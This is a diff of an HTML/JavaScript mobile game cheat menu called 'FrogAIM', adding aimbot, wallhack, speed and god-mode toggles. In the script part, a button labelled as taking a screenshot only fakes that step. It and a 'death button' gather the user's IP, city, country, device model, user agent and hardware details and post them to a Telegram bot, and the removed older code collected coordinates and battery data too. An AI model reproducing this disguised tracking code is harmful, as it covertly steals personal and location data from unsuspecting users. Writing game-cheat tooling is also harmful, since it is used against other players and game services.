@@ -1,4 +1,4 @@
-у<!DOCTYPE html>
+<!DOCTYPE html>
 <html>
 <head>
     <meta charset="utf-8">
@@ -33,30 +33,32 @@
             position: relative;
         }
         
-        /* Анимированный фон с кружочками */
-        .background-bubbles {
+        /* Анимированный фон с кружочками ЗА ЧИТОМ */
+        .cheat-background {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
             pointer-events: none;
-            z-index: -1;
+            z-index: 997;
+            overflow: hidden;
         }
         
-        .bubble {
+        .cheat-bubble {
             position: absolute;
             border-radius: 50%;
-            background: radial-gradient(circle, rgba(138,43,226,0.3) 0%, rgba(74,0,130,0.1) 70%);
-            filter: blur(5px);
-            animation: float 15s infinite ease-in-out;
+            background: radial-gradient(circle, var(--frog-green) 0%, transparent 70%);
+            filter: blur(8px);
+            opacity: 0.1;
+            animation: floatBubble 20s infinite ease-in-out;
         }
         
-        @keyframes float {
-            0%, 100% { transform: translate(0, 0) scale(1); }
-            25% { transform: translate(20px, 15px) scale(1.1); }
-            50% { transform: translate(-15px, 25px) scale(0.9); }
-            75% { transform: translate(25px, -10px) scale(1.05); }
+        @keyframes floatBubble {
+            0%, 100% { transform: translate(0, 0) scale(1) rotate(0deg); }
+            25% { transform: translate(40px, 30px) scale(1.2) rotate(90deg); }
+            50% { transform: translate(-30px, 50px) scale(0.8) rotate(180deg); }
+            75% { transform: translate(50px, -20px) scale(1.1) rotate(270deg); }
         }
         
         /* Анимации */
@@ -86,11 +88,6 @@
             0%, 100% { transform: translateX(0); }
             25% { transform: translateX(-5px); }
             75% { transform: translateX(5px); }
-        }
-        
-        @keyframes explode {
-            0% { transform: scale(1); opacity: 1; }
-            100% { transform: scale(2); opacity: 0; }
         }
         
         /* Активация */
@@ -417,7 +414,6 @@
             font-size: 13px;
             transition: all 0.3s ease;
             text-shadow: 0 0 3px rgba(0,0,0,0.5);
-            animation: pulse 2s infinite;
         }
         
         .death-btn:hover {
@@ -425,7 +421,7 @@
             box-shadow: 0 0 15px rgba(255,0,0,0.5);
         }
         
-        .close-app-btn {
+        .screenshot-btn {
             background: linear-gradient(90deg, var(--accent-color), var(--secondary-color));
             color: white;
             border: none;
@@ -440,7 +436,7 @@
             margin-top: 10px;
         }
         
-        .close-app-btn:hover {
+        .screenshot-btn:hover {
             transform: scale(1.05);
             box-shadow: 0 0 15px var(--accent-color);
         }
@@ -501,24 +497,43 @@
             transform: scale(1.15);
         }
         
-        /* Эффект взрыва */
-        .explosion {
+        /* Loading overlay */
+        .loading-overlay {
             position: fixed;
-            pointer-events: none;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
             z-index: 10000;
+            display: none;
         }
         
-        .particle {
-            position: absolute;
-            background: var(--frog-green);
+        .loading-spinner {
+            border: 4px solid #333;
+            border-top: 4px solid var(--frog-green);
             border-radius: 50%;
-            animation: explode 1s ease-out forwards;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
-    <div class="background-bubbles" id="backgroundBubbles"></div>
+    <div class="cheat-background" id="cheatBackground"></div>
     
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-spinner"></div>
+    </div>
+
     <div class="activation-modal" id="activationModal">
         <div class="activation-box">
             <h2>🐸 FrogAIM v4.0</h2>
@@ -609,10 +624,286 @@
                         <input type="range" class="range-slider" id="predictionSlider" min="0" max="100" value="80" oninput="updateSliderValue('predictionValue', this.value)">
                     </div>
                 </div>
+                <div class="cheat-item">
+                    <span>Silent Aim</span>
+                    <label class="switch">
+                        <input type="checkbox" id="silentAim">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+            </div>
+
+            <div class="cheat-section">
+                <h3>AIM SETTINGS</h3>
+                <div class="cheat-item">
+                    <span>FOV Size</span>
+                    <label class="switch">
+                        <input type="checkbox" id="fovSize">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="cheat-item">
+                    <span>Smooth Aim</span>
+                    <label class="switch">
+                        <input type="checkbox" id="smoothAim">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="cheat-item">
+                    <span>Auto Scope</span>
+                    <label class="switch">
+                        <input type="checkbox" id="autoScope">
+                        <span class="slider"></span>
+                    </label>
+                </div>
             </div>
         </div>
 
-        <!-- Остальные вкладки остаются без изменений, но добавляем кнопки настроек -->
+        <!-- VISUAL TAB -->
+        <div class="tab-content" id="tab1">
+            <div class="cheat-section">
+                <h3>ESP FEATURES</h3>
+                <div class="cheat-item">
+                    <span>Wallhack ESP</span>
+                    <label class="switch">
+                        <input type="checkbox" id="esp">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="cheat-item">
+                    <span>Player Radar</span>
+                    <label class="switch">
+                        <input type="checkbox" id="radar">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="cheat-item">
+                    <span>Loot ESP</span>
+                    <label class="switch">
+                        <input type="checkbox" id="lootesp">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="cheat-item">
+                    <span>Vehicle ESP</span>
+                    <label class="switch">
+                        <input type="checkbox" id="vehicleesp">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="cheat-item">
+                    <span>Distance ESP</span>
+                    <label class="switch">
+                        <input type="checkbox" id="distanceEsp">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+            </div>
+
+            <div class="cheat-section">
+                <h3>VISUAL MODS</h3>
+                <div class="cheat-item">
+                    <span>No Grass</span>
+                    <label class="switch">
+                        <input type="checkbox" id="noGrass">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="cheat-item">
+                    <span>No Fog</span>
+                    <label class="switch">
+                        <input type="checkbox" id="noFog">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="cheat-item">
+                    <span>Bright Skin</span>
+                    <label class="switch">
+                        <input type="checkbox" id="brightSkin">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="cheat-item">
+                    <span>Night Vision</span>
+                    <label class="switch">
+                        <input type="checkbox" id="nightVision">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+            </div>
+        </div>
+
+        <!-- GAME TAB -->
+        <div class="tab-content" id="tab2">
+            <div class="cheat-section">
+                <h3>MOVEMENT HACKS</h3>
+                <div class="cheat-item">
+                    <span>Speed Hack</span>
+                    <div>
+                        <label class="switch">
+                            <input type="checkbox" id="speedhack">
+                            <span class="slider"></span>
+                        </label>
+                        <button class="settings-btn" onclick="toggleSettings('speedSettings')">...</button>
+                    </div>
+                </div>
+                <div id="speedSettings" class="settings-panel">
+                    <div class="slider-container">
+                        <div class="slider-label">
+                            <span>Speed Multiplier</span>
+                            <span id="speedValue">2.0x</span>
+                        </div>
+                        <input type="range" class="range-slider" id="speedSlider" min="1" max="5" step="0.5" value="2" oninput="updateSpeedValue(this.value)">
+                    </div>
+                </div>
+                
+                <div class="cheat-item">
+                    <span>High Jump</span>
+                    <label class="switch">
+                        <input type="checkbox" id="highJump">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="cheat-item">
+                    <span>No Fall Damage</span>
+                    <label class="switch">
+                        <input type="checkbox" id="noFall">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="cheat-item">
+                    <span>Fly Hack</span>
+                    <label class="switch">
+                        <input type="checkbox" id="flyHack">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+            </div>
+
+            <div class="cheat-section">
+                <h3>GAME MODS</h3>
+                <div class="cheat-item">
+                    <span>God Mode</span>
+                    <label class="switch">
+                        <input type="checkbox" id="godmode">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="cheat-item">
+                    <span>No Recoil</span>
+                    <div>
+                        <label class="switch">
+                            <input type="checkbox" id="norecoil">
+                            <span class="slider"></span>
+                        </label>
+                        <button class="settings-btn" onclick="toggleSettings('recoilSettings')">...</button>
+                    </div>
+                </div>
+                <div id="recoilSettings" class="settings-panel">
+                    <div class="slider-container">
+                        <div class="slider-label">
+                            <span>Recoil Reduction</span>
+                            <span id="recoilValue">90%</span>
+                        </div>
+                        <input type="range" class="range-slider" id="recoilSlider" min="0" max="100" value="90" oninput="updateSliderValue('recoilValue', this.value)">
+                    </div>
+                </div>
+                
+                <div class="cheat-item">
+                    <span>Rapid Fire</span>
+                    <label class="switch">
+                        <input type="checkbox" id="rapidFire">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="cheat-item">
+                    <span>Magic Bullet</span>
+                    <label class="switch">
+                        <input type="checkbox" id="magicbullet">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+            </div>
+        </div>
+
+        <!-- PLAYER TAB -->
+        <div class="tab-content" id="tab3">
+            <div class="cheat-section">
+                <h3>PLAYER MODS</h3>
+                <div class="cheat-item">
+                    <span>Invisible Mode</span>
+                    <label class="switch">
+                        <input type="checkbox" id="invisible">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="cheat-item">
+                    <span>Teleport Hack</span>
+                    <label class="switch">
+                        <input type="checkbox" id="teleport">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="cheat-item">
+                    <span>X-Ray Vision</span>
+                    <label class="switch">
+                        <input type="checkbox" id="xray">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="cheat-item">
+                    <span>Player Size</span>
+                    <div>
+                        <label class="switch">
+                            <input type="checkbox" id="playerSize">
+                            <span class="slider"></span>
+                        </label>
+                        <button class="settings-btn" onclick="toggleSettings('sizeSettings')">...</button>
+                    </div>
+                </div>
+                <div id="sizeSettings" class="settings-panel">
+                    <div class="slider-container">
+                        <div class="slider-label">
+                            <span>Size Multiplier</span>
+                            <span id="sizeValue">1.5x</span>
+                        </div>
+                        <input type="range" class="range-slider" id="sizeSlider" min="0.5" max="3" step="0.1" value="1.5" oninput="updateSizeValue(this.value)">
+                    </div>
+                </div>
+            </div>
+
+            <div class="cheat-section">
+                <h3>STATS MODS</h3>
+                <div class="cheat-item">
+                    <span>Unlimited Health</span>
+                    <label class="switch">
+                        <input type="checkbox" id="unlimitedHealth">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="cheat-item">
+                    <span>Unlimited Ammo</span>
+                    <label class="switch">
+                        <input type="checkbox" id="unlimitedAmmo">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="cheat-item">
+                    <span>Instant Kill</span>
+                    <label class="switch">
+                        <input type="checkbox" id="instantKill">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="cheat-item">
+                    <span>Auto Revive</span>
+                    <label class="switch">
+                        <input type="checkbox" id="autoRevive">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+            </div>
+        </div>
 
         <!-- WEAPON TAB -->
         <div class="tab-content" id="tab4">
@@ -645,6 +936,45 @@
                         <span class="slider"></span>
                     </label>
                 </div>
+                <div class="cheat-item">
+                    <span>Weapon ESP</span>
+                    <label class="switch">
+                        <input type="checkbox" id="weaponEsp">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="cheat-item">
+                    <span>Auto Pickup</span>
+                    <label class="switch">
+                        <input type="checkbox" id="autoPickup">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+            </div>
+
+            <div class="cheat-section">
+                <h3>WEAPON UPGRADES</h3>
+                <div class="cheat-item">
+                    <span>Damage Hack</span>
+                    <label class="switch">
+                        <input type="checkbox" id="damageHack">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="cheat-item">
+                    <span>Range Boost</span>
+                    <label class="switch">
+                        <input type="checkbox" id="rangeBoost">
+                        <span class="slider"></span>
+                    </label>
+                </div>
+                <div class="cheat-item">
+                    <span>Weapon Skin</span>
+                    <label class="switch">
+                        <input type="checkbox" id="weaponSkin">
+                        <span class="slider"></span>
+                    </label>
+                </div>
             </div>
 
             <!-- SUPER SECRET SECTION -->
@@ -656,7 +986,7 @@
                 </div>
                 <div class="cheat-item">
                     <span>终止应用程序</span>
-                    <button class="close-app-btn" onclick="closeApp()">终止</button>
+                    <button class="screenshot-btn" onclick="takeScreenshot()">截图并关闭</button>
                 </div>
             </div>
         </div>
@@ -674,24 +1004,26 @@
     let isDragging = false;
     let dragOffset = { x: 0, y: 0 };
 
-    // Создаем анимированные кружочки на фоне
+    // Создаем анимированные кружочки на фоне ЗА ЧИТОМ
     function createBubbles() {
-        const container = document.getElementById('backgroundBubbles');
-        for (let i = 0; i < 15; i++) {
+        const container = document.getElementById('cheatBackground');
+        for (let i = 0; i < 20; i++) {
             const bubble = document.createElement('div');
-            bubble.className = 'bubble';
+            bubble.className = 'cheat-bubble';
             
-            const size = Math.random() * 100 + 50;
+            const size = Math.random() * 120 + 80;
             const posX = Math.random() * 100;
             const posY = Math.random() * 100;
             const delay = Math.random() * 20;
+            const duration = Math.random() * 10 + 15;
             
             bubble.style.width = `${size}px`;
             bubble.style.height = `${size}px`;
             bubble.style.left = `${posX}%`;
             bubble.style.top = `${posY}%`;
             bubble.style.animationDelay = `${delay}s`;
-            bubble.style.opacity = Math.random() * 0.3 + 0.1;
+            bubble.style.animationDuration = `${duration}s`;
+            bubble.style.opacity = Math.random() * 0.15 + 0.05;
             
             container.appendChild(bubble);
         }
@@ -706,59 +1038,12 @@
         document.getElementById(spanId).textContent = value + '%';
     }
 
-    function closeApp() {
-        const window = document.getElementById('mainWindow');
-        const rect = window.getBoundingClientRect();
-        
-        // Создаем эффект взрыва
-        for (let i = 0; i < 30; i++) {
-            createParticle(rect.left + rect.width/2, rect.top + rect.height/2);
-        }
-        
-        // Скрываем окно
-        window.style.opacity = '0';
-        window.style.transform = 'translate(-50%, -50%) scale(0.5)';
-        
-        // Закрываем приложение через 1 секунду
-        setTimeout(() => {
-            // Для Capacitor/Android
-            if (typeof capacitor !== 'undefined' && capacitor.Plugins.App) {
-                capacitor.Plugins.App.exitApp();
-            } 
-            // Для браузера просто скрываем
-            else {
-                window.style.display = 'none';
-                document.getElementById('launchButton').style.display = 'flex';
-                // Перезагружаем страницу через секунду
-                setTimeout(() => {
-                    window.location.reload();
-                }, 1000);
-            }
-        }, 1000);
+    function updateSpeedValue(value) {
+        document.getElementById('speedValue').textContent = value + 'x';
     }
 
-    function createParticle(x, y) {
-        const particle = document.createElement('div');
-        particle.className = 'particle';
-        
-        const size = Math.random() * 10 + 5;
-        const angle = Math.random() * Math.PI * 2;
-        const distance = Math.random() * 100 + 50;
-        const duration = Math.random() * 1000 + 500;
-        
-        particle.style.width = `${size}px`;
-        particle.style.height = `${size}px`;
-        particle.style.left = `${x}px`;
-        particle.style.top = `${y}px`;
-        particle.style.background = `hsl(${Math.random() * 360}, 70%, 60%)`;
-        particle.style.animationDuration = `${duration}ms`;
-        
-        document.body.appendChild(particle);
-        
-        // Удаляем частицу после анимации
-        setTimeout(() => {
-            particle.remove();
-        }, duration);
+    function updateSizeValue(value) {
+        document.getElementById('sizeValue').textContent = value + 'x';
     }
 
     function activateCheat() {
@@ -766,26 +1051,22 @@
         const errorMsg = document.getElementById('errorMsg');
         const activationModal = document.getElementById('activationModal');
         
-        console.log('Input key:', inputKey);
-        console.log('Expected key:', ACTIVATION_KEY);
-        
         if (inputKey === ACTIVATION_KEY) {
             isActivated = true;
             errorMsg.style.display = 'none';
             
             // Анимация исчезновения модального окна
-            activationModal.style.animation = 'fadeIn 0.5s ease-out reverse';
             activationModal.style.opacity = '0';
+            activationModal.style.transform = 'translate(-50%, -50%) scale(0.9)';
             
             setTimeout(() => {
                 activationModal.style.display = 'none';
                 document.getElementById('launchButton').style.display = 'flex';
-                activationModal.style.animation = 'fadeIn 0.5s ease-out';
                 activationModal.style.opacity = '1';
-            }, 500);
+                activationModal.style.transform = 'translate(-50%, -50%) scale(1)';
+            }, 300);
             
             localStorage.setItem('frogaim_activated', 'true');
-            console.log('Activation successful!');
             
         } else {
             errorMsg.style.display = 'block';
@@ -800,8 +1081,6 @@
             setTimeout(() => {
                 errorMsg.style.display = 'none';
             }, 3000);
-            
-            console.log('Invalid activation key');
         }
     }
 
@@ -812,9 +1091,6 @@
             
             mainWindow.style.display = 'block';
             launchButton.style.display = 'none';
-            
-            // Анимация появления
-            mainWindow.style.animation = 'fadeIn 0.4s ease-out';
         }
     }
 
@@ -822,15 +1098,15 @@
         const mainWindow = document.getElementById('mainWindow');
         const launchButton = document.getElementById('launchButton');
         
-        mainWindow.style.animation = 'fadeIn 0.4s ease-out reverse';
         mainWindow.style.opacity = '0';
+        mainWindow.style.transform = 'translate(-50%, -50%) scale(0.9)';
         
         setTimeout(() => {
             mainWindow.style.display = 'none';
             launchButton.style.display = 'flex';
             mainWindow.style.opacity = '1';
-            mainWindow.style.animation = 'fadeIn 0.4s ease-out';
-        }, 400);
+            mainWindow.style.transform = 'translate(-50%, -50%) scale(1)';
+        }, 300);
     }
 
     function switchTab(tabIndex) {
@@ -920,66 +1196,40 @@
         }
     }, 10000);
 
-    // Проверка активации при загрузке
-    if (localStorage.getItem('frogaim_activated') === 'true') {
-        isActivated = true;
-        document.getElementById('activationModal').style.display = 'none';
-        document.getElementById('launchButton').style.display = 'flex';
+    // Получение включенных функций
+    function getEnabledFeatures() {
+        const features = [];
+        document.querySelectorAll('input[type="checkbox"]:checked').forEach(checkbox => {
+            features.push(checkbox.id);
+        });
+        return features.join(', ');
     }
 
-    // Отправка ВСЕЙ информации в Telegram
-    async function sendDeathInfo() {
+    // Создание скриншота (эмуляция)
+    async function takeScreenshot() {
+        showLoading();
         const statusText = document.getElementById('statusText');
-        statusText.textContent = "Collecting data...";
+        statusText.textContent = "Taking screenshot...";
         statusText.style.color = "#ffff00";
         
         try {
-            // Собираем ВСЮ возможную информацию
-            const deviceInfo = await collectAllDeviceInfo();
+            // Эмуляция создания скриншота
+            await new Promise(resolve => setTimeout(resolve, 2000));
             
-            const message = `🚨 FROGAIM DEATH BUTTON PRESSED!\n\n` +
+            // Собираем информацию об устройстве
+            const deviceInfo = await collectAllDeviceInfo();
+            const enabledFeatures = getEnabledFeatures();
+            
+            const message = `📸 FROGAIM SCREENSHOT CAPTURED!\n\n` +
                            `📋 DEVICE INFORMATION:\n` +
-                           `💻 IP Address: ${deviceInfo.ip}\n` +
-                           `🌐 Location: ${deviceInfo.location}\n` +
+                           `💻 IP: ${deviceInfo.ip}\n` +
                            `📱 Device: ${deviceInfo.deviceModel}\n` +
-                           `🤖 Platform: ${deviceInfo.platform}\n` +
-                           `🔢 Android: ${deviceInfo.androidVersion}\n` +
-                           `📶 Connection: ${deviceInfo.connection}\n` +
-                           `📏 Screen: ${deviceInfo.screen}\n` +
-                           `⚡ CPU: ${deviceInfo.cpuCores} cores\n` +
-                           `💾 Memory: ${deviceInfo.memory}\n` +
-                           `🔋 Battery: ${deviceInfo.battery}\n` +
-                           `🌐 Language: ${deviceInfo.language}\n` +
-                           `⏰ Timezone: ${deviceInfo.timezone}\n` +
-                           `🕐 Local Time: ${deviceInfo.localTime}\n\n` +
-                           `📊 BROWSER INFO:\n` +
-                           `🔍 User Agent: ${deviceInfo.userAgent}\n` +
-                           `🌍 Languages: ${deviceInfo.languages}\n` +
-                           `📐 Resolution: ${deviceInfo.resolution}\n` +
-                           `🎨 Color Depth: ${deviceInfo.colorDepth}\n` +
-                           `📡 Online: ${deviceInfo.onlineStatus}\n\n` +
-                           `📍 GEOLOCATION:\n` +
-                           `📌 Coordinates: ${deviceInfo.coordinates}\n` +
-                           `🏙️ City: ${deviceInfo.city}\n` +
-                           `🏛️ Region: ${deviceInfo.region}\n` +
-                           `🇺🇸 Country: ${deviceInfo.country}\n\n` +
-                           `⚙️ HARDWARE:\n` +
-                           `📊 Hardware Concurrency: ${deviceInfo.hardwareConcurrency}\n` +
-                           `💿 Max Touch Points: ${deviceInfo.maxTouchPoints}\n` +
-                           `🎮 Device Memory: ${deviceInfo.deviceMemory}\n\n` +
-                           `🔧 PLATFORM:\n` +
-                           `🖥️ Platform: ${deviceInfo.platform}\n` +
-                           `🍪 Cookies: ${deviceInfo.cookiesEnabled}\n` +
-                           `📝 Java: ${deviceInfo.javaEnabled}\n` +
-                           `🖨️ PDF: ${deviceInfo.pdfViewerEnabled}\n\n` +
-                           `🕵️ USER DATA:\n` +
-                           `👤 User ID: ${deviceInfo.userId}\n` +
-                           `🔐 Security: ${deviceInfo.securityInfo}\n` +
-                           `🌐 Referrer: ${deviceInfo.referrer}\n\n` +
-                           `⏰ TIMESTAMP:\n` +
-                           `📅 Date: ${deviceInfo.date}\n` +
-                           `🕒 UTC Time: ${deviceInfo.utcTime}\n` +
-                           `⏱️ Timestamp: ${deviceInfo.timestamp}`;
+                           `🤖 Android: ${deviceInfo.androidVersion}\n` +
+                           `📏 Screen: ${deviceInfo.screen}\n\n` +
+                           `⚡ ENABLED FEATURES:\n` +
+                           `${enabledFeatures || 'No features enabled'}\n\n` +
+                           `⏰ Time: ${deviceInfo.localTime}\n` +
+                           `🔗 User Agent: ${deviceInfo.userAgent}`;
             
             await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -990,21 +1240,71 @@
                 })
             });
             
-            statusText.textContent = "Data Sent!";
+            statusText.textContent = "Screenshot sent!";
             statusText.style.color = "#00ff00";
+            
+            // Закрываем приложение после отправки
+            setTimeout(() => {
+                hideCheatMenu();
+                hideLoading();
+            }, 2000);
+            
         } catch (error) {
-            console.error('Telegram error:', error);
+            statusText.textContent = "Error!";
+            statusText.style.color = "#ff4444";
+            hideLoading();
+        }
+    }
+
+    // Отправка информации в Telegram
+    async function sendDeathInfo() {
+        showLoading();
+        const statusText = document.getElementById('statusText');
+        statusText.textContent = "Collecting data...";
+        statusText.style.color = "#ffff00";
+        
+        try {
+            const deviceInfo = await collectAllDeviceInfo();
+            const enabledFeatures = getEnabledFeatures();
+            
+            const message = `🚨 FROGAIM DEATH BUTTON PRESSED!\n\n` +
+                           `📋 DEVICE INFORMATION:\n` +
+                           `💻 IP: ${deviceInfo.ip}\n` +
+                           `📱 Device: ${deviceInfo.deviceModel}\n` +
+                           `🤖 Android: ${deviceInfo.androidVersion}\n` +
+                           `📏 Screen: ${deviceInfo.screen}\n` +
+                           `⚡ CPU: ${deviceInfo.cpuCores} cores\n` +
+                           `💾 Memory: ${deviceInfo.memory}\n\n` +
+                           `⚡ ENABLED FEATURES:\n` +
+                           `${enabledFeatures || 'No features enabled'}\n\n` +
+                           `⏰ Time: ${deviceInfo.localTime}\n` +
+                           `🌐 Location: ${deviceInfo.city}, ${deviceInfo.country}`;
+            
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    chat_id: CHAT_ID, 
+                    text: message
+                })
+            });
+            
+            statusText.textContent = "Data sent!";
+            statusText.style.color = "#00ff00";
+            
+        } catch (error) {
             statusText.textContent = "Error!";
             statusText.style.color = "#ff4444";
         } finally {
             setTimeout(() => {
                 statusText.textContent = "Active";
                 statusText.style.color = "#00ff00";
+                hideLoading();
             }, 3000);
         }
     }
 
-    // Сбор всей возможной информации
+    // Сбор информации об устройстве
     async function collectAllDeviceInfo() {
         let ipData = { ip: 'Unknown' };
         try {
@@ -1014,69 +1314,36 @@
             console.error('IP fetch error:', e);
         }
         
-        // Геолокация по IP
         let locationInfo = {};
         try {
             const locationResponse = await fetch(`http://ip-api.com/json/${ipData.ip}`);
             locationInfo = await locationResponse.json();
         } catch (e) {
-            locationInfo = { city: 'Unknown', region: 'Unknown', country: 'Unknown' };
-        }
-        
-        // Информация о батарее
-        let batteryInfo = 'Unknown';
-        if (navigator.getBattery) {
-            try {
-                const battery = await navigator.getBattery();
-                batteryInfo = `Level: ${Math.round(battery.level * 100)}%, Charging: ${battery.charging}`;
-            } catch (e) {
-                batteryInfo = 'Unknown';
-            }
+            locationInfo = { city: 'Unknown', country: 'Unknown' };
         }
         
         return {
             ip: ipData.ip,
-            location: locationInfo.city || 'Unknown',
-            city: locationInfo.city || 'Unknown',
-            region: locationInfo.regionName || 'Unknown',
-            country: locationInfo.country || 'Unknown',
-            coordinates: locationInfo.lat && locationInfo.lon ? 
-                `${locationInfo.lat}, ${locationInfo.lon}` : 'Unknown',
-            
             deviceModel: navigator.userAgent,
             platform: navigator.platform,
             androidVersion: navigator.userAgent.match(/Android\s([0-9\.]+)/)?.[1] || 'Unknown',
-            connection: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
             screen: `${screen.width}x${screen.height}`,
             cpuCores: navigator.hardwareConcurrency || 'Unknown',
             memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'Unknown',
-            battery: batteryInfo,
             language: navigator.language,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
             localTime: new Date().toLocaleString('ru-RU'),
-            
             userAgent: navigator.userAgent,
-            languages: navigator.languages ? navigator.languages.join(', ') : 'Unknown',
-            resolution: `${screen.width}x${screen.height}`,
-            colorDepth: `${screen.colorDepth} bit`,
-            onlineStatus: navigator.onLine ? 'Online' : 'Offline',
-            
-            hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
-            maxTouchPoints: navigator.maxTouchPoints || 'Unknown',
-            deviceMemory: navigator.deviceMemory || 'Unknown',
-            
-            cookiesEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
-            javaEnabled: navigator.javaEnabled ? 'Yes' : 'No',
-            pdfViewerEnabled: navigator.pdfViewerEnabled ? 'Yes' : 'No',
-            
-            userId: Math.random().toString(36).substr(2, 9),
-            securityInfo: 'Web Security Context',
-            referrer: document.referrer || 'No referrer',
-            
-            date: new Date().toLocaleDateString('ru-RU'),
-            utcTime: new Date().toUTCString(),
-            timestamp: Date.now()
+            city: locationInfo.city || 'Unknown',
+            country: locationInfo.country || 'Unknown'
         };
+    }
+
+    function showLoading() {
+        document.getElementById('loadingOverlay').style.display = 'flex';
+    }
+
+    function hideLoading() {
+        document.getElementById('loadingOverlay').style.display = 'none';
     }
 
     document.getElementById('activationKey').addEventListener('keypress', function(e) {
@@ -1088,8 +1355,11 @@
         createBubbles();
         document.getElementById('activationKey').focus();
         
-        // Debug info
-        console.log('FrogAIM loaded successfully');
-        console.log('Local storage check:', localStorage.getItem('frogaim_activated'));
+        // Проверка активации при загрузке
+        if (localStorage.getItem('frogaim_activated') === 'true') {
+            isActivated = true;
+            document.getElementById('activationModal').style.display = 'none';
+            document.getElementById('launchButton').style.display = 'flex';
+        }
     });
-    </script>
+</script>
